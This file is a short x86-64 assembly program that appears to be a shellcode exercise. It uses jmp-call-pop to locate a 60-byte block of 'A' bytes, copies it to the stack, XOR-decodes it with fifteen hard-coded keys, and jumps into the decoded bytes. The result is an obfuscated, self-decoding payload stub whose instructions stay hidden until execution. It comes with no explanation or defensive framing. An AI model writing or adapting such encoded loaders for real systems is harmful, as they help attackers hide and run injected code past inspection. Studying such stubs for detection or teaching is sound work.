	.global _start
	.text
_start:
	push %rbp
	mov %rsp, %rbp
	sub $0x200, %rsp
	jmp trois

un:
	pop %rsi
	mov %rsp, %rdi
	mov $60, %ecx
	cld
	rep movsb
	mov %rsp, %rsi
	jmp deux

deux:
	xorl $0x2b280970, (%rsi)
	add $4, %rsi
	xorl $0xb70970be, (%rsi)
	add $4, %rsi
	xorl $0x1909c8b3, (%rsi)
	add $4, %rsi
	xorl $0x4e442b7a, (%rsi)
	add $4, %rsi
	xorl $0x190970b7, (%rsi)
	add $4, %rsi
	xorl $0x09c8b313, (%rsi)
	add $4, %rsi
	xorl $0x27296c31, (%rsi)
	add $4, %rsi
	xorl $0x272b2909, (%rsi)
	add $4, %rsi
	xorl $0xfa6e2328, (%rsi)
	add $4, %rsi
	xorl $0x2f6e2320, (%rsi)
	add $4, %rsi
	xorl $0x3212151e, (%rsi)
	add $4, %rsi
	xorl $0x4e440970, (%rsi)
	add $4, %rsi
	xorl $0x8109c281, (%rsi)
	add $4, %rsi
	xorl $0x7d0970be, (%rsi)
	add $4, %rsi
	xorl $0x4e44d1d1, (%rsi)
	add $4, %rsi
	jmp *%rsp

trois:
	call un
quatre:
	.byte 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41

